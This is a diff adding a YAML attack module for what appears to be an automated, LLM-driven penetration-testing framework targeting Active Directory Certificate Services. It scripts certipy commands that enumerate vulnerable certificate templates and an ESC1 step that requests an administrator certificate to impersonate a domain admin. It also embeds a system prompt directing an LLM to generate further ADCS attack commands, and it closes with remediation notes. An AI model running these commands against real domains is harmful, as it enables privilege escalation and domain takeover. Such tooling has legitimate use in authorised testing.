@@ -1,0 +1,107 @@
+skill_id: certipy_ad
+name: "Certipy ADCS Exploitation (ESC1-ESC13)"
+category: network
+phase: foothold
+version: "1.0"
+
+principle: |
+  Active Directory Certificate Services (ADCS) 是常见的域内 PKI 基础设施。
+  Misconfigurations in certificate templates and enrollment permissions can lead to:
+  - ESC1: 主题替代名称(SAN)可指定 → 冒充任意用户
+  - ESC4: 模板 ACL 写入 → 修改模板使其易受攻击
+  - ESC8: NTLM Relay 到 ADCS Web Enrollment
+  利用 certipy 可枚举易受攻击的证书模板并进行凭据窃取/提权。
+
+match:
+  rules:
+    - variable_present: ["domain_found"]
+    - evidence_contains: ["certificate"]
+    - evidence_contains: ["adcs"]
+    - evidence_contains: ["pki"]
+    - evidence_contains: ["certserv"]
+    - evidence_contains: ["certsrv"]
+
+probes:
+  - id: certipy_enum
+    description: "certipy find 枚举易受攻击的证书模板"
+    command: |
+      echo "[*] ADCS 证书服务枚举"
+      certipy find -u anonymous -p '' -dc-ip {TARGET_IP} -vulnerable -stdout 2>&1 | head -100 || true
+      echo "[*] certipy find (无凭据尝试)"
+      certipy find -u '' -p '' -dc-ip {TARGET_IP} -stdout -timeout 10 2>&1 | head -50 || true
+      echo "CERTIPY_ENUM_DONE"
+    timeout: 60
+    parse_rules:
+      - if_contains: ["ESC1", "ESC4", "ESC8", "vulnerable"]
+        set: { adcs_vulnerable: true }
+      - if_contains: ["Certificate Templates"]
+        set: { adcs_found: true }
+
+exploit_paths:
+  - path_id: certipy_vuln_enum
+    name: "ADCS 漏洞枚举与攻击路径发现"
+    priority: 1
+    conditions:
+      adcs_found: true
+    steps:
+      - id: vuln_scan
+        description: "扫描易受攻击的 ADCS 模板"
+        command: |
+          echo "[*] ADCS 漏洞扫描"
+          certipy find -dc-ip {TARGET_IP} -vulnerable -stdout 2>&1 | head -150 || true
+          echo "[*] 解析易受攻击的模板"
+          certipy find -dc-ip {TARGET_IP} -stdout -enabled 2>&1 | head -100 || true
+          echo "CERTIPY_VULN_SCAN_DONE"
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["CERTIPY_VULN_SCAN_DONE"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "certipy_enum"
+
+  - path_id: certipy_esc1_exploit
+    name: "ESC1 (SAN 指定) 利用 — 冒充 Domain Admin"
+    priority: 2
+    conditions:
+      adcs_vulnerable: true
+    steps:
+      - id: esc1_impersonate
+        description: "ESC1 攻击: 请求 Administrator 证书 → 获取 TGT"
+        command: |
+          echo "[*] ESC1 攻击: 请求管理员证书"
+          certipy req -u anonymous -p '' -dc-ip {TARGET_IP} -ca "DC-CA" -template "ESC1-Template" -upn "administrator@domain.local" -key-size 4096 -debug 2>&1 | head -100 || true
+          echo "ESC1_ATTEMPTED"
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["Saved certificate", "ESC1_ATTEMPTED"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "certipy_esc1"
+
+  - path_id: llm_freeform
+    name: "LLM 自由推理（ADCS 攻击）"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+
+llm:
+  max_rounds: 5
+  freeform_system_prompt: |
+    【漏洞范围】Active Directory Certificate Services (ADCS) 攻击
+    【严格限制】
+    - 只能尝试 ADCS 相关攻击（ESC1-ESC13）
+    - certipy find -vulnerable 枚举易受攻击的模板
+    - certipy req 请求证书
+    - certipy auth -pfx 将证书转为 TGT/Kirbi
+    - 禁止扫描其他非 AD 服务端口
+    - 每次只生成一条命令
+    【可用工具】certipy, certipy-ad, netexec ldap
+
+remediation: |
+  1. 审计证书模板权限，删除低权限用户的 Enroll 权限
+  2. 删除 SAN 可指定的模板（ESC1）
+  3. 强制 Manager Approval（CA 证书管理器审批）
+  4. 移除不需要的 Subject Name 标志（CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT）
+  5. 禁用 Web Enrollment 的 HTTP 端点或启用 EPA（ESC8）
